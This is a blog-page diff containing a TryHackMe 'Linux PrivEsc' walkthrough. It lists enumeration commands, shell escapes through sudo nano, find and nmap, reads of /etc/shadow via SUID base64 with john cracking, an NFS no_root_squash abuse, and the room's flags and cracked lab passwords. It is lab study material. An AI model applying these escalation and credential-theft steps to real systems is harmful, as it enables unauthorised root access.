@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>TryHackMe - Linux PrivEsc</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - Linux PrivEsc | 0xskar</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="TryHackMe - Linux PrivEsc" />
+<meta name="author" content="0xskar" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://tryhackme.com/room/linprivesc" />
+<meta property="og:description" content="https://tryhackme.com/room/linprivesc" />
+<link rel="canonical" href="http://localhost:4000/TryHackMe-Linux-PrivEsc" />
+<meta property="og:url" content="http://localhost:4000/TryHackMe-Linux-PrivEsc" />
+<meta property="og:site_name" content="0xskar" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-17T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe - Linux PrivEsc" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0xskar","url":"https://0xskar.github.io"},"dateModified":"2022-06-17T00:00:00-07:00","datePublished":"2022-06-17T00:00:00-07:00","description":"https://tryhackme.com/room/linprivesc","headline":"TryHackMe - Linux PrivEsc","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/TryHackMe-Linux-PrivEsc"},"url":"http://localhost:4000/TryHackMe-Linux-PrivEsc"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>0xskar@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TryHackMe - Linux PrivEsc</h2>
+  <time datetime="2022-06-17T00:00:00-07:00" class="by-line">17 Jun 2022</time>
+  <p><a href="https://tryhackme.com/room/linprivesc">https://tryhackme.com/room/linprivesc</a></p>
+
+<p>Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques. Netstat and Find.</p>
+
+<hr />
+
+<h2 id="task-1---introduction"><a href="#header-2"></a>Task 1 - Introduction</h2>
+
+<p>This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.</p>
+
+<hr />
+
+<h2 id="task-2---what-is-privilege-escalation"><a href="#header-2"></a>Task 2 - What is Privilege Escalation?</h2>
+
+<p>It’s rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:</p>
+
+<ul>
+  <li>Resetting passwords</li>
+  <li>Bypassing access controls to compromise protected data</li>
+  <li>Editing software configurations</li>
+  <li>Enabling persistence</li>
+  <li>Changing the privilege of existing (or new) users</li>
+  <li>Execute any administrative command</li>
+</ul>
+
+<h2 id="task-3---enumeration"><a href="#header-2"></a>Task 3 - Enumeration</h2>
+
+<p>Enumeration is the first step you have to take once you gain access to any system.</p>
+
+<p>Useful Enumeration Commands:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">hostname</code></td>
+      <td>Returns the hostname of the machine</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">uname -a</code></td>
+      <td>Prints system information and detail about the kernal</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">cat /proc/version</code></td>
+      <td>Provides information about the target system processes</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">cat /etc/issue</code></td>
+      <td>This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ps</code></td>
+      <td>see running processes. <code class="language-plaintext highlighter-rouge">ps -A</code> views all running processes. <code class="language-plaintext highlighter-rouge">ps axjf</code> view process tree</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">env</code></td>
+      <td>shows enviromental variables</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo -l</code></td>
+      <td>lists all commands user can run as sudo (useful for gaining root shell)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ls -las</code></td>
+      <td>using flags like this can see hidden files/directories</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">id</code></td>
+      <td>provide a general overview of the user’s privilege level and group memberships.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">cat /etc/passwd</code></td>
+      <td>discover users on the system can also be piped to be cut for useful list for brute-force attacks <code class="language-plaintext highlighter-rouge">cut -d ":" -f 1</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">history</code></td>
+      <td>looks at earliar commands in the history</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ifconfig</code></td>
+      <td>show information about network configuration</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ip route</code></td>
+      <td>see which network routes exist</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="netstat-command"><a href="#header-4"></a>Netstat Command</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>Flag</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-a</code></td>
+      <td>shows all ports and connections, <code class="language-plaintext highlighter-rouge">-at</code> or <code class="language-plaintext highlighter-rouge">-au</code> to list TCP or UDP protocols</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-l</code></td>
+      <td>list port in listening mode; these ports are open and ready to accept incoming connections.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-s</code></td>
+      <td>list network statistics by protocol (can also be used with -t or -u)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-tp</code></td>
+      <td>list connection with service name a4play timers</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="find-command"><a href="#header-4"></a>Find Command</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find . -name flag1.txt</code></td>
+      <td>find the file named “flag1.txt” in the current directory</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find /home -name flag1.txt</code></td>
+      <td>find the file names “flag1.txt” in the /home directory</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -type d -name config</code></td>
+      <td>find the directory named config under “/”</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -type f -perm 0777</code></td>
+      <td>find files with the 777 permissions (files readable, writable, and executable by all users)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -perm a=x</code></td>
+      <td>find executable files</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find /home -user frank</code></td>
+      <td>find all files for user “frank” under “/home”</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -mtime 10</code></td>
+      <td>find files that were modified in the last 10 days</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -atime 10</code></td>
+      <td>find files that were accessed in the last 10 day</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -cmin -60</code></td>
+      <td>find files changed within the last hour (60 minutes)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -amin -60</code></td>
+      <td>find files accesses within the last hour (60 minutes)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -size 50M</code></td>
+      <td>find files with a 50 MB size</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -writable -type d 2&gt;/dev/null</code></td>
+      <td>Find world-writeable folders</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -perm -222 -type d 2&gt;/dev/null</code></td>
+      <td>Find world-writeable folders</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -perm -o w -type d 2&gt;/dev/null</code></td>
+      <td>Find world-writeable folders</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -perm -o x -type d 2&gt;/dev/null</code></td>
+      <td>Find world-executable folders</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -name perl*</code></td>
+      <td>Find perl</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -name python*</code></td>
+      <td>Find python</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -name gcc*</code></td>
+      <td>Find gcc</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code></td>
+      <td>Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Time to get familiar with <code class="language-plaintext highlighter-rouge">find</code>, <code class="language-plaintext highlighter-rouge">locate</code>, <code class="language-plaintext highlighter-rouge">grep</code>, <code class="language-plaintext highlighter-rouge">cut</code>, <code class="language-plaintext highlighter-rouge">sort</code>.</p>
+
+<h5 id="answer-the-questions-below"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>What is the hostname of the target system?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">hostname</code> wade7363</li>
+</ul>
+
+<p><strong>What is the Linux kernel version of the target system?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">uname -a</code> 3.13.0-24-generic</li>
+</ul>
+
+<p><strong>What Linux is this?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cat /etc/issue</code> Ubuntu 14.04 LTS</li>
+</ul>
+
+<p><strong>What version of the Python language is installed on the system?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">python -V</code> 2.7.6</li>
+</ul>
+
+<p><strong>What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)</strong></p>
+
+<ul>
+  <li>exploit-db 3.13.0 ubuntu gives us CVE-2015-1328</li>
+</ul>
+
+<hr />
+
+<h2 id="task-4---automated-enumeration-tools"><a href="#header-2"></a>Task 4 - Automated Enumeration Tools</h2>
+
+<ul>
+  <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPeas</a></li>
+  <li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+  <li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a></li>
+  <li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a></li>
+  <li><a href="https://github.com/linted/linuxprivchecker">Linux Priv Checker</a></li>
+</ul>
+
+<hr />
+
+<h2 id="task-5---privilege-escalation-kernel-exploits"><a href="#header-2"></a>Task 5 - Privilege Escalation: Kernel Exploits</h2>
+
+<h5 id="answer-the-questions-below-1"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>Find and use the appropriate kernel exploit to gain root privileges on the target system.</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">uname -a</code> Ubuntu 3.13.0-24-generic</li>
+  <li><code class="language-plaintext highlighter-rouge">searchsploit 3.13.0</code> setup <code class="language-plaintext highlighter-rouge">python3 -m http.server 8009</code> and wget it to target machine</li>
+  <li>befor transfering over compile with <code class="language-plaintext highlighter-rouge">gcc</code> then <code class="language-plaintext highlighter-rouge">chmod +x</code> and execute to gain root shell.</li>
+</ul>
+
+<p><strong>What is the content of the flag1.txt file?</strong></p>
+
+<p><img src="/assets/linprivesc01.png" alt="" /></p>
+
+<hr />
+
+<h2 id="task-6---privilege-escalation-sudo"><a href="#header-2"></a>Task 6 - Privilege Escalation: Sudo</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sudo -l</code> we can see what commands we can run as sudoer</li>
+  <li><a href="https://gtfobins.github.io/">GTFO Bins</a> provides info on how we can use these programs for leverage.</li>
+</ul>
+
+<h5 id="answer-the-questions-below-2"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>How many programs can the user “karen” run on the target system with sudo rights?</strong></p>
+
+<ul>
+  <li>3</li>
+</ul>
+
+<p><strong>What is the content of the flag2.txt file?</strong></p>
+
+<ul>
+  <li>THM-402028394</li>
+</ul>
+
+<p><strong>How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">sudo nmap --interactive</code></li>
+</ul>
+
+<p><strong>What is the hash of frank’s password?</strong></p>
+
+<p>We get access to root via nano:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano
+^R^X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0
+</code></pre></div></div>
+<p>cat /etc/shadow</p>
+<ul>
+  <li>$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</li>
+</ul>
+
+<hr />
+
+<h2 id="task-7---privilege-escalation-suid"><a href="#header-2"></a>Task 7 - Privilege Escalation: SUID</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">find / -type f -perm -04000 -ls 2&gt;/dev/null</code> will list files that have SUID or SGID bits set.</li>
+</ul>
+
+<p>A good practice would be to compare executables on this list with <a href="https://gtfobins.github.io/#+suid">GTFOBins</a>. Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list.</p>
+
+<h5 id="answer-the-questions-below-3"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>Which user shares the name of a great comic book writer?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cat /etc/passwd</code></li>
+  <li>gerryconway</li>
+</ul>
+
+<p><strong>What is the password of user2?</strong></p>
+
+<p>We have to get access to /etc/shadow and /etc/passwd in order to feed it to john’s <code class="language-plaintext highlighter-rouge">unshadow</code> tool.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">sudo -l</code></li>
+  <li>/usr/bin/base64 has the SUID bit set.</li>
+  <li><code class="language-plaintext highlighter-rouge">base64 /etc/shadow</code></li>
+  <li>decrypt and save this to shadow.txt and save /etc/passwd to passwd.txt</li>
+  <li><code class="language-plaintext highlighter-rouge">unshadow passwd.txt shadow.txt &gt; passwords.txt</code></li>
+  <li><code class="language-plaintext highlighter-rouge">john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt</code></li>
+</ol>
+
+<ul>
+  <li>Password1</li>
+</ul>
+
+<p><strong>What is the content of the flag3.txt file?</strong></p>
+
+<ul>
+  <li>we know the flag is at /home/ubuntu/flag3.txt</li>
+  <li><code class="language-plaintext highlighter-rouge">base64 /home/ubuntu/flag3.txt</code> and decode for the flag</li>
+  <li>THM-3847834</li>
+</ul>
+
+<hr />
+
+<h2 id="task-8---privilege-escalation-capabilities"><a href="#header-2"></a>Task 8 - Privilege Escalation: Capabilities</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">getcap -r / 2&gt;/dev/null</code> to list enabled capabilities</li>
+</ul>
+
+<h5 id="answer-the-questions-below-4"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>How many binaries have set capabilities?</strong></p>
+
+<ul>
+  <li>6</li>
+</ul>
+
+<p><strong>What other binary can be used through its capabilities?</strong></p>
+
+<ul>
+  <li>view</li>
+</ul>
+
+<p><strong>What is the content of the flag4.txt file?</strong></p>
+
+<ul>
+  <li>THM-9349843</li>
+</ul>
+
+<hr />
+
+<h2 id="task-9---privilege-escalation-cron-jobs"><a href="#header-2"></a>Task 9 - Privilege Escalation: Cron Jobs</h2>
+
+<ul>
+  <li>Any user can read the file keeping system-wide cron jobs under <code class="language-plaintext highlighter-rouge">/etc/crontab</code></li>
+</ul>
+
+<h5 id="answer-the-questions-below-5"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>How many user-defined cron jobs can you see on the target system?</strong></p>
+
+<ul>
+  <li>4</li>
+</ul>
+
+<p><strong>What is the content of the flag5.txt file?</strong></p>
+
+<ul>
+  <li>THM-383000283</li>
+</ul>
+
+<p><strong>What is Matt’s password?</strong></p>
+
+<ul>
+  <li>We can <code class="language-plaintext highlighter-rouge">unshadow</code> and feed to john to get 123456</li>
+</ul>
+
+<hr />
+
+<h2 id="task-10---privilege-escalation-path"><a href="#header-2"></a>Task 10 - Privilege Escalation: PATH</h2>
+
+<p>Be sure you can answer the questions below before trying this.</p>
+
+<ul>
+  <li>What folders are located under $PATH</li>
+  <li>Does your current user have write privileges for any of these folders?</li>
+  <li>Can you modify $PATH?</li>
+  <li>Is there a script/application you can start that will be affected by this vulnerability?</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">find / -writable 2&gt;/dev/null</code> - find writable folders
+<code class="language-plaintext highlighter-rouge">find / -writable 2&gt;/dev/null | cut -d "/" -f 2 | sort -u</code> - cleaned up</p>
+
+<h5 id="answer-the-questions-below-6"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>What is the odd folder you have write access for?</strong></p>
+
+<ul>
+  <li>/home/murdoch</li>
+</ul>
+
+<p><strong>What is the content of the flag6.txt file?</strong></p>
+
+<ul>
+  <li>THM-736628929</li>
+</ul>
+
+<hr />
+
+<h2 id="task-11---privilege-escalation-nfs"><a href="#header-2"></a>Task 11 - Privilege Escalation: NFS</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cat /etc/exports</code> - NFS (Network File Sharing) configuration is kept in the /etc/exports file. The critical element for this privilege escalation vector is the “<code class="language-plaintext highlighter-rouge">no_root_squash</code>” option. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.</li>
+</ul>
+
+<h5 id="answer-the-questions-below-7"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>How many mountable shares can you identify on the target system?</strong></p>
+
+<ul>
+  <li>3</li>
+</ul>
+
+<p><strong>How many shares have the “no_root_squash” option enabled?</strong></p>
+
+<ul>
+  <li>3</li>
+</ul>
+
+<p><strong>Gain a root shell on the target system</strong></p>
+
+<ul>
+  <li>mount sharedfolder <code class="language-plaintext highlighter-rouge">mount -o rw target:/home/ubuntu/sharedfolder /tmp/superbackups</code> and chmod +s nfs file from example.</li>
+</ul>
+
+<p><strong>What is the content of the flag7.txt file?</strong></p>
+
+<ul>
+  <li>THM-89384012</li>
+</ul>
+
+<hr />
+
+<h2 id="task-12---capstone-challenge"><a href="#header-2"></a>Task 12 - Capstone Challenge</h2>
+
+<p>You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
+We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.</p>
+
+<p>Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.</p>
+
+<p>You can access the target machine over your browser or use the SSH credentials below.</p>
+
+<ul>
+  <li>Username: leonard</li>
+  <li>Password: Penny123</li>
+</ul>
+
+<h5 id="answer-the-questions-below-8"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p>Notes:</p>
+<ul>
+  <li>Linux Version 3.10.0-1160.el7.x86_64</li>
+  <li>SUID /usr/bin/base64</li>
+  <li>Vulnerable to CVE-2021-4034</li>
+  <li>PATH Abuses <code class="language-plaintext highlighter-rouge">/home/leonard/</code> <code class="language-plaintext highlighter-rouge">/home/leonard/perl5</code></li>
+  <li>CVE Suggestions: [CVE-2016-5195] dirtycow [CVE-2016-5195] dirtycow 2</li>
+  <li>users: leonard, missy, root</li>
+</ul>
+
+<p><strong>What is the content of the flag1.txt file?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">scp leonard@10.10.113.87:/etc/passwd passwd_challenge.txt</code></li>
+  <li><code class="language-plaintext highlighter-rouge">base64</code> has SUID so we can read /etc/shadow and decrype and save to shadow_challenge.txt</li>
+  <li><code class="language-plaintext highlighter-rouge">unshadow passwd_challenge.txt shadow_challenge.txt &gt; challenge.txt</code></li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">john challenge.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+  </li>
+  <li>
+    <p>missy password = Password1</p>
+  </li>
+  <li>flag.txt is in documents</li>
+</ul>
+
+<p><strong>What is the content of the flag2.txt file?</strong></p>
+
+<ul>
+  <li>missy can fun find as sudo</li>
+  <li><code class="language-plaintext highlighter-rouge">sudo find . -exec /bin/sh \; -quit</code> gives us a root shell!</li>
+  <li>cat rootflag/flag2.txt</li>
+</ul>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>0xskar</b>
+    </span>
+    
+    <span>© 2022</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
